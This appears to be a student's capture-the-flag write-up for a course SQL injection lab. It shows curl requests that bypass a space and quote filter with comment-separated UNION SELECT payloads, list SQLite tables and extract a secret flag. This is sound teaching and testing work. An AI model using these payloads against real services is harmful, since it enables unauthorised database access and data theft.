# Challenge 3 (SQL Injection)

### 1.

> Quelle partie du service est vulnérable à une injection SQL ?

The ID field of the JSON request to fetch the flower data.

### 2.

> Le serveur implémente une forme insuffisante de validation des entrées. Expliquer pourquoi c'est insuffisant.

Trying out some requests revealed that at least spaces and quotes where always giving an error.
Though we could see that another error was given when the given ID provoked an SQL exception that wasn't caught the same way as with invalid IDs.

```
❯ curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"id "}'
{"error": "Invalid id"}

❯ curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"\'1\'"}'
{"error":"Invalid id"}

❯ curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"a"}'
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

As such, since the requests allows strings we can give the name of the field since `WHERE id=id` is valid in SQL and we manage to dump all flowers at once!

```
❯ curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"id"}'
[[1,"Rose","Red",5],[2,"Sunflower","Yellow",20],[3,"Tulip","Pink",6],[4,"Lily","White",6],[5,"Daisy","White",34]]
```

Though that is not particularly helpful. What is helpful though is that SQL does not require the use of any space or quotes for that matter,
so now we can try to figure out a way to dump the tables, without using any spaces or quotes.

### 3.

> Quel est le flag ? Comment avez-vous procédé pour l’obtenir ?

`SLH25{D0N7_P4r53_5Q1_M4NU411Y}`

We needed to list the tables first, so we were on to finding a union query that would allow us to know where the flag is located,
since we have already figured out it is not in the flowers table through the previous query giving `id=id`.

Using the hint given at question 4, we first tried testing DBMS that are **not** MySQL or MariaDB, the first guess was sqlite.
Why? Because it seemed more reasonable than PostgresQL or Oracle for a small exercise :-)

So, now to have queries without spaces, we can simply replace these using comments, as such with a quick recipe we were able to
quickly find the name of the table and to extract the flag. We knew through the JSON response that we should have 4 columns
in the output of the union query to avoid exceptions. We ran, in order, the following statements with their "anti-filter" version:

```
id union select type,name,sql,4 from sqlite_master
id/**/union/**/select/**/type,name,sql,4/**/from/**/sqlite_master

❯ curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"id/**/union/**/select/**/type,name,sql,4/**/from/**/sqlite_master"}' | jq '.[] | select(.[0] == "table")'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   520  100   446  100    74  22785   3780 --:--:-- --:--:-- --:--:-- 27368
[
  "table",
  "flowers",
  "CREATE TABLE flowers (\n            id INTEGER PRIMARY KEY,\n            name TEXT,\n            color TEXT,\n            petals INTEGER\n        )",
  4
]
[
  "table",
  "super_secret_stuff",
  "CREATE TABLE super_secret_stuff (name TEXT PRIMARY KEY, value TEXT)",
  4
]

id union select name,value,3,4 from super_secret_stuff
id/**/union/**/select/**/name,value,3,4/**/from/**/super_secret_stuff/**/

❯ curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"0/**/union/**/select/**/name,value,3,4/**/from/**/super_secret_stuff/**/"}'
[["flag","SLH25{D0N7_P4r53_5Q1_M4NU411Y}",3,4]]
```

And here lies the flag!

### 4.

> Quel est le DBMS utilisé ? Auriez-vous procédé différement si le DBMS avait été MySQL ou MariaDB ?

sqlite.

With MySQL or MariaDB, we would have proceeded the same way though enumerating the tables would have required extracting
the data from `information_schema` rather than `sqlite_master`.

